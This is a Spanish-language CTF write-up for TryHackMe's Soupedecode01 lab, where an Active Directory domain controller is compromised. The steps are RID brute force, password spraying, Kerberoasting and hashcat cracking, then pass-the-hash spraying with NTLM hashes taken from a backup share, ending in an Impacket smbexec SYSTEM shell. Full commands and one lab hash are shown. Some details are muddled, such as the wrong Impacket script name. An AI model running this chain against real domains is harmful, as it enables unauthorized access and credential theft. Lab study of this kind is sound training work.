# 🏆 Write-up CTF: Soupedecode01 (TryHackMe)

¡Bienvenido al write-up de la sala Soupedecode01 de TryHackMe!

Esta sala es un excelente desafío para practicar técnicas de compromiso de Active Directory (AD), enfocándose en la enumeración y explotación de credenciales. La resolución nos guio a través de un proceso simulado de penetración en un dominio de Windows.

A lo largo de este write-up, cubriremos los siguientes pasos clave:

Enumeración inicial mediante técnicas como RID Bruteforce para obtener una lista de usuarios válidos.

Descubrimiento de credenciales a través de ataques de Password Spraying.

Explotación de vulnerabilidades de AD, específicamente el ataque de Kerberoasting, para obtener credenciales de cuentas de servicio.

Acceso a recursos compartidos SMB con información sensible (hashes y usuarios).

Obtención de las credenciales de un administrador del Domain Controller (DC), culminando el desafío.

**Aclarar que he tenido que reiniciar la máquina en varias ocasiones por mal funcionamiento debido a esto cambia la IP de la misma.**

## 🎯 Paso 1: Reconocimiento Activo - Ping (Descubrimiento de Host)

El primer y crucial paso en cualquier CTF es confirmar que la máquina objetivo está activa y que existe conectividad de red. Para ello, utilizamos la herramienta ping, limitada a 4 paquetes para un reconocimiento rápido (-c 4).

📝 Comando y Análisis

Utilizamos el comando ping con el siguiente formato, donde 10.10.207.252 es la IP objetivo:

<img width="616" height="318" alt="Ping" src="https://github.com/user-attachments/assets/18b27e2c-0b0e-4b9a-bb95-db4c36165920" />

````
Bash

ping -c 4 10.10.207.252
````

Resultado:

Se muestra la siguiente salida en la terminal, confirmando la accesibilidad:

Conclusiones del Ping:

✅ Host Activo: Se recibieron 4 paquetes de 4 enviados.

📦 Pérdida de Paquetes (Packet Loss): 0% de pérdida de paquetes, lo que indica una conexión estable.

⏱️ Tiempo de Respuesta (RTT): Los tiempos de respuesta (alrededor de 43-49 ms) son buenos, confirmando una conectividad adecuada para continuar con la enumeración.

Con la máquina confirmada como operativa, podemos pasar al siguiente paso de escaneo de puertos.


## 🔍 Paso 2: Escaneo de Puertos con Nmap (Enumeración de Servicios)

Una vez confirmada la conectividad, el siguiente paso es identificar qué puertos están abiertos y qué servicios se están ejecutando en la máquina objetivo. Esto nos proporcionará información crucial sobre el sistema operativo y la arquitectura de red.

📝 Comando de Escaneo

Utilizamos el escaneo más común y robusto, que combina la detección de versión (-sV), el escaneo de scripts por defecto (-sC) y el modo de escaneo de todo el rango de puertos (-p-), aunque en este caso, se usó un escaneo rápido (-T4) sobre los puertos más comunes.

<img width="1068" height="792" alt="Nmap" src="https://github.com/user-attachments/assets/b6bea5e6-9555-4b95-b347-0c1c670614e8" />

El comando ejecutado fue:

````
Bash

nmap -T4 -n -sC -sV -p- 10.10.207.252 # (o la variante de la captura: nmap -T4 -n -sC -sV 10.10.207.252)
````

Resultado del Escaneo:

🔎 Análisis de Puertos Abiertos

El escaneo de Nmap revela que el host es un Domain Controller (DC) de Windows, lo cual es evidente por los servicios clásicos de Active Directory.

````
Puerto	Servicio	Descripción	Relevancia
53/tcp	domain	DNS (Simple DNS Plus)	Utilizado para resolución de nombres en el dominio.
88/tcp	kerberos-sec	Kerberos (AD Authentication)	CLAVE para la autenticación en AD (potencial Kerberoasting).
135/tcp	msrpc	Microsoft RPC	Comunicación de procesos internos de Windows.
139/tcp	netbios-ssn	NETBIOS Session Service	Comunicación de red heredada.
389/tcp	ldap	LDAP (Active Directory)	CLAVE para la consulta y gestión de directorios.
445/tcp	microsoft-ds	SMB (Server Message Block)	CLAVE para compartir archivos y carpetas.
464/tcp	kpasswd5	Kerberos Change/Set Password	Servicios de Kerberos.
636/tcp	ldap	LDAPS (LDAP Seguro)	Comunicación LDAP cifrada.
3389/tcp	ms-wbt-server	RDP (Remote Desktop Protocol)	Acceso remoto al escritorio, común en DCs.
````

Información Adicional Crucial:

🌳 Dominio Detectado: SOUPEDECODE.LOCAL

🖥️ Nombre del Host/DC: DC01.SOUPEDECODE.LOCAL

🔑 SSL Certificate Subject: CN=DC01.SOUPEDECODE.LOCAL

⚙️ Sistema Operativo: OS: Windows (Microsoft Windows)

🤝 SMB Security Mode: Message signing enabled and required

Conclusión:

El objetivo es un Domain Controller de Windows que forma parte del dominio SOUPEDECODE.LOCAL. 


## ⚙️ Paso 3: Preparación y Enumeración Inicial de SMB

Antes de avanzar con los ataques de enumeración de Active Directory (AD), es buena práctica agregar el nombre del dominio al archivo /etc/hosts. Esto nos permite usar el nombre de host y el FQDN (Fully Qualified Domain Name) en lugar de solo la IP, lo que a menudo es necesario para que las herramientas de AD funcionen correctamente. Luego, procedemos a enumerar recursos compartidos (shares) a través de SMB.

3.1. 💾 Añadiendo el Dominio a /etc/hosts

Utilizamos el comando nano (o cualquier editor) y añadimos la IP del Domain Controller y su FQDN al final del archivo.

<img width="709" height="281" alt="agregamos el domnio a hotst" src="https://github.com/user-attachments/assets/bbecc8e0-d031-43cf-811f-07af7d7ed29f" />

Comando:
````
Bash

sudo nano /etc/hosts
# Se agrega la línea:
# 10.10.207.252 DC01.SOUPEDECODE.LOCAL
````

Verificación:

Ahora, el sistema operativo puede resolver DC01.SOUPEDECODE.LOCAL directamente a la IP objetivo.

3.2. 📂 Enumeración de Recursos Compartidos SMB con crackmapexec (nxc)

La herramienta crackmapexec (ahora conocida como nxc) es perfecta para realizar una enumeración rápida de servicios de Windows. Intentamos conectarnos como un usuario invitado (guest) para ver qué recursos compartidos (shares) podríamos enumerar sin credenciales válidas.

<img width="1051" height="655" alt="enumramos con nxc" src="https://github.com/user-attachments/assets/d3bd77f0-3f59-447c-a68b-f2d9ff84be7e" />


Comando:
````
Bash

nxc smb DC01.SOUPEDECODE.LOCAL -u 'guest' -p '' --shares
````
Resultado y Análisis:

El escaneo revela varios shares por defecto de Windows y AD:

````
Share	Permiso Detectado	Descripción
ADMIN$		Recurso de administración remota.
Backup		Recurso con nombre interesante (posiblemente un punto de interés).
C$		Unidad C (acceso de administrador).
IPC$	READ	Comunicación entre procesos.
NETLOGON		Recurso de inicio de sesión de dominio.
SYSVOL		Directorio de archivos del dominio (GPOs, scripts, etc.).
Users		Directorio de perfiles de usuario.
````

Conclusión:

El recurso Backup es particularmente interesante, ya que no es un share estándar y a menudo contiene información o scripts útiles.


## 👤 Paso 4: Enumeración de Usuarios con SID Bruteforce (RID Cycling)

En entornos de Active Directory, es posible enumerar nombres de usuario válidos utilizando una técnica conocida como RID Cycling o SID Bruteforce. Esta técnica explota la forma en que Windows asigna identificadores relativos (RID) a los objetos del dominio, como las cuentas de usuario. Al intentar autenticarse con RIDs consecutivos (generalmente a partir de 1000), podemos diferenciar entre RIDs que corresponden a un usuario real y aquellos que no.

Utilizamos crackmapexec (nxc) con el módulo SMB y la flag --rid para realizar este ataque contra el Domain Controller.

<img width="869" height="734" alt="enumero ahora con nxc pero la badera --rid" src="https://github.com/user-attachments/assets/06a8d6c6-4e03-4707-bff7-eab32683fd81" />


📝 Comando de Enumeración
````
Bash

nxc smb 10.10.207.252 --rid
````

🖥️ Resultado y Análisis

Conclusión:

La herramienta logró identificar un gran número de usuarios válidos en el dominio SOUPEDECODE.LOCAL y nos proporciona la lista completa.


## 🔑 Paso 5: Creación de Lista de Usuarios y Password Spraying Básico

Con la lista de usuarios válidos del dominio, el siguiente ataque lógico en Active Directory es el Password Spraying. Esta técnica consiste en probar una o pocas contraseñas comunes contra muchos usuarios, en lugar de muchas contraseñas contra un solo usuario, lo que minimiza el riesgo de bloqueo de cuentas.

5.1. 📝 Creando la Lista de Usuarios

Primero, necesitamos guardar la lista completa de usuarios en un archivo de texto. Podemos lograr esto reutilizando el comando de enumeración de RID y filtrando la salida con herramientas como awk o grep.

<img width="1100" height="53" alt="ahroa creo una lsita con los usuarios usando nxc" src="https://github.com/user-attachments/assets/a7a28a4c-82b7-4327-847e-8cbbe98cb6b1" />


Comando para Extracción:
````
Bash

nxc smb DC01.SOUPEDECODE.LOCAL -u "guest" -p "" --rid-brute | awk '{split($5,a,"\\"); print a[2]}' > valid_usernames.txt
````

Nota: El comando en la captura utiliza una sintaxis ligeramente diferente, pero el objetivo final es el mismo: extraer solo el nombre de usuario del FQDN (SOUPEDECODE.LOCAL\usuario) y guardarlo en valid_usernames.txt.

5.2. 🌬️ Password Spraying: Usuario = Contraseña

Una suposición inicial común, a menudo exitosa en entornos de prueba o mal configurados, es que la contraseña es idéntica al nombre de usuario. Utilizaremos el archivo valid_usernames.txt tanto para la lista de usuarios como para la lista de contraseñas.

<img width="1033" height="301" alt="encontramos el usuario" src="https://github.com/user-attachments/assets/38aba4a6-f606-4838-800e-be5a0596b469" />

Comando de Ataque:

Utilizamos nxc con la opción de SMB, apuntando a la lista de usuarios (-u) y el mismo archivo para la lista de contraseñas (-p).
````
Bash

nxc smb DC01.SOUPEDECODE.LOCAL -u valid_usernames.txt -p valid_usernames.txt
````
Resultado y Hallazgo:

El ataque arroja muchos fallos de inicio de sesión (STATUS_LOGON_FAILURE), pero se detiene en un usuario que tuvo éxito.

Credenciales Encontradas:
````
Usuario	Contraseña	Estado
ybob317	ybob317	Éxito (STATUS_SUCCESS)
````

Conclusión:

Hemos obtenido el primer conjunto de credenciales válidas: ybob317:ybob317. Esto nos proporciona un punto de apoyo inicial como usuario estándar del dominio.


## 📂 Paso 6: Re-Enumeración de Recursos Compartidos (SMB)

Ahora que tenemos credenciales válidas (ybob317:ybob317), volvemos a utilizar nxc para enumerar los shares. El objetivo es determinar si este usuario tiene permisos de lectura (READ) o escritura (WRITE) en recursos que antes no podíamos acceder como invitado.

📝 Comando de Enumeración con Credenciales

Ejecutamos el mismo comando que en el paso 3, pero especificando las credenciales de ybob317.

<img width="1424" height="236" alt="listamos recursos del usuario" src="https://github.com/user-attachments/assets/9584fd8c-e16b-4866-b858-eb25dceac010" />

````
Bash

nxc smb 10.10.207.252 -u 'ybob317' -p 'ybob317' --shares
````

🖥️ Resultado y Análisis de Permisos

Al utilizar las credenciales de ybob317, la salida revela los permisos para los diferentes recursos:
````
Share	Permisos Detectados	Análisis
ADMIN$		Sin acceso de lectura/escritura (esperado para un usuario estándar).
backup		Sin permisos explícitos de lectura/escritura detectados (aún sospechoso).
C$		Sin acceso.
IPC$		Utilizado para comunicación interna.
NETLOGON	READ	Permiso de lectura.
SYSVOL	READ	Permiso de lectura.
Users	READ	Permiso de lectura (posiblemente al perfil de ybob317).
````

Conclusión:

Aunque el usuario ybob317 no nos otorgó acceso explícito a shares sensibles como Backup con permisos de lectura/escritura directos, el hecho de tener credenciales válidas abre la puerta a ataques de enumeración más avanzados, como la consulta de propiedades de usuario vía LDAP o, más importante en este contexto, el ataque de Kerberoasting. Esto es crucial porque nos permite enumerar cuentas que podrían tener credenciales débiles o ser cuentas de servicio valiosas.


## 🚩 Paso 7: Obtención de la Flag de Usuario a través de SMB

Dado que hemos identificado el recurso compartido Users y que el usuario ybob317 tiene permisos de lectura, intentaremos conectarnos directamente al share de Users y buscar la flag de usuario dentro del directorio de ybob317.

7.1. 🚪 Conexión Vía SMBClient

Utilizamos la herramienta smbclient para conectarnos al share Users del Domain Controller.

<img width="778" height="768" alt="entramos por smb" src="https://github.com/user-attachments/assets/353f878f-ecd1-4641-9e4f-bfe8e4a464b7" />

Comando:
````
Bash

smbclient //10.10.207.252/Users -U ybob317
````
Navegación:

Una vez conectados, listamos los directorios (dir) disponibles en el share Users.

Vemos el directorio ybob317, que es el perfil de nuestro usuario actual.

Entramos al directorio del usuario: cd ybob317.

Dentro, listamos el contenido (dir) y buscamos el archivo de la flag, típicamente llamado user.txt.

Encontramos que la flag se encuentra dentro del escritorio: cd Desktop.

7.2. ⬇️ Descarga de la Flag

Una vez localizados en el directorio /ybob317/Desktop, utilizamos el comando get de smbclient para descargar el archivo user.txt a nuestro sistema operativo Kali.

<img width="971" height="52" alt="descargo la flag" src="https://github.com/user-attachments/assets/e5f80552-265e-4e87-b9cb-c11208530bcf" />

Comando en smbclient:
````
Bash

get user.txt
````
7.3. ✅ Lectura de la Flag

Salimos de smbclient y leemos el contenido del archivo user.txt en nuestra terminal.

<img width="1808" height="205" alt="flag user obtenida " src="https://github.com/user-attachments/assets/236d68b3-0827-4509-a065-c269bf9dcf40" />

Comando en Kali:
````
Bash

cat user.txt
````
Resultado:

¡Usuario Flag Obtenida! 🎉

Con esto, hemos completado la primera fase. Ahora debemos buscar el vector de escalada de privilegios para obtener la flag de root. 


## 💥 Paso 8: Ataque de Kerberoasting para Obtener Hashes

El Kerberoasting es un tipo de ataque post-explotación en Active Directory que permite a un atacante obtener hashes de contraseñas de las cuentas de servicio (Service Accounts) que tienen asignado un Nombre Principal de Servicio (Service Principal Name o SPN).

Cualquier usuario autenticado en el dominio (como ybob317) puede solicitar Tickets de Servicio (TGS) para cualquier SPN. Si la cuenta de servicio está configurada con una contraseña débil, podemos capturar el hash del ticket TGS y romperlo fuera de línea.

📝 Comando de Ataque con Impacket

Utilizamos el script GetNPUsers.py de la suite Impacket para buscar y solicitar tickets TGS para cuentas Kerberoastables.

<img width="1816" height="414" alt="verificamos cuentas kerberiastables" src="https://github.com/user-attachments/assets/639d5df5-a27c-41bb-8b15-6ce335c62582" />

````
Bash

GetUserSPNs.py SOUPEDECODE.LOCAL/ybob317 -request -dc-ip 10.10.207.252
````
Nota: Es común usar GetUserSPNs.py para solicitar los tickets y obtener los hashes.

🖥️ Resultado y Extracción del Hash


El script de Impacket enumera las cuentas de servicio con SPNs y, crucialmente, solicita los tickets TGS, que contienen el hash de la contraseña de la cuenta de servicio.

Cuentas Kerberoastables Encontradas:

El escaneo identificó varias cuentas de servicio, todas candidatas:

http/fileserver (file_svc)

ftp/proxyServer (firewall_svc)

http/Backupserver (backup_svc)

http/webserver (web_svc)

https/MonitoringServer (monitoring_svc)

El script capturó un hash largo al final de la salida, correspondiente a uno de los tickets TGS solicitados (en este caso, la línea comienza con $krb5tgs$, indicando un hash Kerberos TGS).

Hash Capturado (Ejemplo de formato):
````
$krb5tgs$23$*file_svc$SOUPEDECODE.LOCAL$http/fileserver*$C962A5A2A1A8...
````
Conclusión:

Hemos extraído un hash de Kerberos (TGS-REP) que ahora podemos guardar en un archivo, por ejemplo hash_kerberoast.txt, para iniciar el descifrado fuera de línea. El siguiente paso es intentar descifrar este hash.


## 🔨 Paso 9: Descifrado del Hash Kerberoasting con Hashcat

Con el hash TGS capturado en el paso anterior, es el momento de utilizar una herramienta de cracking de contraseñas de alto rendimiento como Hashcat para intentar obtener la contraseña en texto plano de la cuenta de servicio.

📝 Preparación y Comando de Hashcat

Guardar Hash: el hash capturado ha sido guardado en un archivo llamado hashes.txt.

Identificar Modo: El hash TGS de Kerberoasting ($krb5tgs$) corresponde al modo 13100 en Hashcat.

Seleccionar Wordlist: Utilizaremos la wordlist común y potente rockyou.txt para el ataque de diccionario.

Comando de Descifrado:
````
Bash

hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt --force
````

Nota: El flag --force se utiliza a menudo en entornos CTF de VM para evitar advertencias de driver o recursos.

🖥️ Resultado y Credenciales

Hashcat comienza el proceso de descifrado y, tras un breve tiempo (dependiendo de la complejidad de la contraseña y la wordlist), encuentra la coincidencia.

<img width="1617" height="198" alt="descubirmos contraseña de file svc" src="https://github.com/user-attachments/assets/0a0d3061-5ded-4802-90d8-90d7e1152ca9" />

Credenciales Obtenidas:
````
Usuario	Contraseña
file_svc	[Contraseña Descubierta]
````

Conclusión:

Hemos obtenido las credenciales de la cuenta de servicio file_svc. Las cuentas de servicio a menudo tienen permisos para acceder a recursos compartidos o servicios específicos. Nuestro próximo paso será investigar qué podemos hacer con esta nueva cuenta, especialmente enfocándonos en el share Backup que nos pareció sospechoso.


## 🗃️ Paso 10: Explotación de la Cuenta de Servicio y Obtención de Datos de Backup

El objetivo de esta etapa es usar las nuevas credenciales de la cuenta de servicio (file_svc:[Contraseña]) para investigar el recurso compartido backup que había sido inaccesible o sospechoso hasta ahora.

10.1. 🔎 Re-Enumeración con file_svc

Volvemos a utilizar nxc con las credenciales de file_svc para verificar los permisos en los recursos compartidos.

<img width="1427" height="261" alt="lsitamos recurtsos comprartidos de file svc" src="https://github.com/user-attachments/assets/ce8b86bd-ac6a-4ae9-9e67-641c188b6b64" />

Comando:
````
Bash

nxc smb 10.10.146.226 -u 'file_svc' -p '[ContraseñaDescifrada]' --shares
````

Conclusión:

El usuario file_svc tiene permiso de READ en el share backup. Esto confirma que esta cuenta de servicio está destinada, como su nombre lo indica, a manejar operaciones de respaldo.

10.2. 📥 Acceso y Descarga del Archivo

Utilizamos smbclient nuevamente, pero esta vez apuntando al recurso backup y autenticándonos con file_svc.

<img width="1264" height="226" alt="entro a file svc y descargo el contendio de backup" src="https://github.com/user-attachments/assets/e27246e3-9cf0-4d99-b5b4-fa69ffaf3ff4" />

Comando:
````
Bash

smbclient //DC01.SOUPEDECODE.LOCAL/backup -U file_svc
# O usando la IP:
smbclient //10.10.146.226/backup -U file_svc
````
Navegación y Descarga:

Una vez dentro del share backup, listamos el contenido (ls).

Encontramos un archivo llamado backup_extract.txt.

Lo descargamos a nuestra máquina Kali usando el comando get.


## 💥 Paso 11: Escalada de Privilegios Final (Hash Spraying y Pwned)

El archivo backup_extract.txt contiene nombres de usuario de servicio y sus hashes NTLM correspondientes, lo que nos permite realizar un ataque de Hash Spraying (probar un conjunto de hashes conocidos contra diferentes usuarios) para encontrar un hash que sea válido para otro usuario o, crucialmente, para una cuenta de administrador.

<img width="823" height="218" alt="el contenido del arhcivo backup extrac" src="https://github.com/user-attachments/assets/f159041d-8003-46f7-8283-21833cd62f79" />


11.1. ✂️ Separación de Usuarios y Hashes

Primero, preparamos la información para utilizarla con nxc. Extraemos la lista de usuarios y la lista de hashes de las líneas de backup_extract.txt.

<img width="670" height="60" alt="separamos users y hashes" src="https://github.com/user-attachments/assets/c5b39f8a-ba5f-46c4-99fb-7d94b0abd6a6" />


Comandos de Extracción:

Extraer Usuarios: Usamos cut para tomar el primer campo, delimitado por dos puntos (:).
````
Bash

cat backup_extract.txt | cut -d ':' -f 1 > backup_extract_users.txt

cat backup_extract.txt | cut -d ':' -f 4 > backup_extract_hashes.txt
````

Extraer Hashes (y RIDs): Necesitamos el formato completo RID:Hash_LM:Hash_NTLM para nxc. El backup_extract.txt tiene el formato User:RID:Hash_LM:Hash_NTLM:::. Extraemos la parte del hash NTLM, aunque en este caso, nxc permite probar los hashes completos de la lista, ya que asumiremos que las contraseñas son las mismas (o el hash es válido para un usuario superior).

Para simplificar el hash spraying, usamos los nombres de servidor como usuarios y los hashes NTLM.

11.2. 🌬️ Hash Spraying para Encontrar Credenciales Válidas

Utilizamos nxc en modo Hash Spraying para probar los hashes NTLM extraídos contra todos los nombres de servidor/usuario listados. Esto simula que todos los servidores podrían estar usando una contraseña simple o compartida, lo que podría ser válida para una cuenta con más privilegios.

<img width="1407" height="246" alt="descubrimos cuenta de acceso valida" src="https://github.com/user-attachments/assets/9a606ede-b2ae-4eaa-8b31-674018b94b2f" />


Comando de Ataque:
````
Bash

nxc smb 10.10.177.183 -u backup_extract_users.txt -H backup_extract_hashes.txt --no-bruteforce --continue-on-success
````
Nota: El flag -H indica que se usará hash en lugar de contraseña. El comando en la captura utiliza una técnica de spraying de usuarios y hashes conocidos, buscando una coincidencia.

Resultado y Hallazgo:

El ataque arroja un inicio de sesión exitoso.

Credencial Encontrada:

El hash de la cuenta FileServer$ (que es un nombre de máquina/cuenta de servicio) funciona con la contraseña Pwn3d!. ¡Hemos encontrado las credenciales de un administrador o una cuenta con alta autoridad en el sistema!

Usuario	Contraseña

FileServer$	Pwn3d!


11.3. 💀 Obtención de Shell de System/Administrator y Root Flag

Ahora, utilizamos la suite Impacket, específicamente el script smbexec.py, para autenticarnos con el hash de FileServer$ y obtener un shell semi-interactivo en el Domain Controller.

<img width="1326" height="235" alt="obtenemos acceso a la cuenta administrador y asi la flag root" src="https://github.com/user-attachments/assets/389debd9-c3af-4704-8ac7-33bf7d9078ab" />

Comando de Ejecución Remota:
````
Bash

smbexec.py -hashes :e41da7e79a4c76dbd9cf79d1cb325559 SOUPEDECODE.LOCAL/FileServer\$@DC01.SOUPEDECODE.LOCAL
````
Nota: La contraseña 'Pwn3d!' se traduce a un hash NTLM que se usa directamente.

Escalada de Privilegios:

Al obtener el shell, el comando WHOAMI confirma que hemos escalado exitosamente a la máxima autoridad: nt authority\system.

Obtención de la Flag de Root:

Finalmente, navegamos hasta el escritorio del administrador para obtener la flag final.

Comando en el Shell Remoto:
````
Bash

type c:\Users\Administrator\Desktop\root.txt
````

¡Root Flag Obtenida! 🎉

Con esto, el CTF Soupedecode01 ha sido completado.
